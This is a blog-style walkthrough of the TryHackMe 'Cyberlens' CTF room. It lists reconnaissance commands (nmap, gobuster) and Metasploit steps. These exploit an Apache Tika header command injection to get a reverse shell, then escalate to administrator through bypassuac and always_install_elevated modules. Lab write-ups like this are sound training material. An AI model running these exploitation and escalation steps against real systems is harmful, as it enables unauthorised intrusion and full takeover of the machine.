---
title: "THM: Cyberlens"
date: 2025-03-04
categories: [CTF, Red Team]
tags: [CTF, Red Team]
permalink: /posts/ctf-cyberlens
image:
  path: /assets/img/thumbnails/ctf-cyberlens.png
---



### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Easy  

#### **Tools Used**:

  - Nmap  
  - Gobuster  
  - Exiftool  
  - Metasploit  
  - Searchsploit  
  - Developer Tools (Network Tab)

#### **Resources Used:**:

  - [Tryhackme](https://tryhackme.com/room/cyberlensp6)
  - [Nmap Documentation](https://nmap.org/book/man.html)  
  - [Gobuster GitHub Repository](https://github.com/OJ/gobuster)  
  - [Metasploit Framework](https://www.metasploit.com/)  
  - [Searchsploit Documentation](https://www.exploit-db.com/searchsploit) 


## **Steps for the CTF**

---


### Step 1: Initial Reconnaissance
After starting the machine, I explored the website hosted on the target system. While browsing, I didn’t immediately find any actionable information. To gather more details about the services running on the machine, I performed a port scan using **Nmap**.

#### Command:
```bash
nmap -sV -sC -A -T4 -oN scan_result.md <ip>
```

#### Explanation:
The above command performs a comprehensive scan of the target IP. It identifies open ports, service versions, and runs default scripts to gather additional information. Use the output to identify potential attack vectors.

---

### Step 2: SMB Enumeration
I attempted to exploit the machine using **smbclient**, but this approach did not yield any fruitful results. If you're attempting this step, ensure you test for SMB vulnerabilities such as misconfigurations or anonymous access.

---

### Step 3: Directory Enumeration
Realizing that SMB wasn’t yielding results, I turned to directory enumeration using **Gobuster**.

#### Command:
```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_dirs.txt
```

#### Explanation:
This command scans the web server for hidden directories and files. Analyze the discovered paths to identify potential points of interest. In my case, I found several directories containing image files.

---

### Step 4: Image Metadata Analysis
Among the discovered directories, I downloaded some image files and analyzed their metadata using **exiftool**. Unfortunately, this approach didn’t reveal anything significant. However, always check metadata for hidden clues such as comments, geolocation, or embedded scripts.

---

### Step 5: Revisiting the Room Description
At this point, I realized I had made a mistake in my approach. I returned to the room description and carefully re-read it. This helped me understand that I had been going down the wrong path. With this new perspective, I adjusted my strategy.

#### Key Insight:
The description mentioned adding an entry to the `/etc/hosts` file. After making this change, I resumed exploring the website. This adjustment revealed a new button that allowed me to upload files.

---

### Step 6: File Upload Functionality
With the file upload feature now accessible, I decided to upload an image to test the functionality. Then, I monitored the network traffic using the Developer Tools’ Network tab.

#### Observation:
I observed traffic on port **61777**. Further investigation revealed that the server was using **Apache Tika**.

---

### Step 7: Exploiting Apache Tika
I searched for vulnerabilities related to Apache Tika using **searchsploit**. A **Header Command Injection** vulnerability was identified, which could be exploited using **Metasploit**.

#### Steps:
1. Open **msfconsole**.
2. Search for the Apache Tika exploit:
   ```bash
   search apache tika
   ```
3. Configure the exploit with the following settings:
   ```bash
   set RHOSTS <Target IP>
   set RPORT 61777
   set LHOST <Your VPN IP>
   ```
4. Run the exploit.

#### Outcome:
Successfully executing the exploit granted me a shell on the target system. I confirmed my location using the `pwd` command and found myself in the `/c:/windows/system32` directory.

---

### Step 8: Capturing the User Flag
I navigated to the **Users** directory and accessed the **cyberlens** user’s Desktop, where I found the first flag.

#### Commands:
```bash
cd /Users/cyberlens/Desktop
cat user.txt
```

---

### Step 9: Privilege Escalation
To escalate privileges and obtain the admin flag, I backgrounded my current session and searched for privilege escalation exploits.

#### Steps:
1. Background the current session:
   ```bash
   background
   ```
2. Search for UAC bypass exploits:
   ```bash
   search bypassuac
   ```
3. Configure and run the exploit:
   ```bash
   set SESSION 1
   set LHOST <Your VPN IP>
   run
   ```
4. Once the session is elevated, use the **local_exploit_suggester** module to identify potential privilege escalation exploits:
   ```bash
   run multi/recon/local_exploit_suggester
   ```
5. Exploit the suggested vulnerability (e.g., **always_install_elevated**):
   ```bash
   use exploit/windows/local/always_install_elevated
   ```

#### Final Steps:
Navigate to the Administrator’s Desktop and retrieve the admin flag:
```bash
cd /c:/Users/Administrator/Desktop
cat admin.txt
```
